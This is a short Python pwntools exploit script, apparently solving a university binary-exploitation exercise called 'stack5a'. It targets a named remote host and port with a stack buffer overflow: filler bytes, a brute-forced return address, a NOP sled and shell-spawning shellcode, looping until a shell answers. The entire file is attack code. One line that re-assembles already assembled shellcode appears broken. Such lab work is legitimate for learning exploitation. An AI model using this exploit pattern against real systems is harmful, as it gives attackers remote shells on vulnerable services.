from pwn import ELF, context, p64, remote, shellcraft, asm

kek = -100
while True:
    # il coso da eseguire
    context.binary = ELF(path="./stack5a")

    p = remote(host="lettieri.iet.unipi.it", port=4405)
    # p = remote(host="localhost", port=4405)
    p.recvline()

    shellcode=asm(shellcraft.sh())
    shellcode=asm(shellcode)

    nop=asm(shellcraft.nop())
    nop=b"\x90"

    offset = kek * 4
    kek-=1
    print(offset)

    p.sendline(b"A" * 136 + p64(0x7fffffffe368 + offset) + nop*0x1000 + shellcode) 

    try:
        p.sendline(b"ls")
        p.recvline(timeout=1)
        p.recvline(timeout=1)
        break

    except KeyboardInterrupt:
        exit(0)
    except EOFError:
        p.close()
        continue
    except:
        p.interactive()



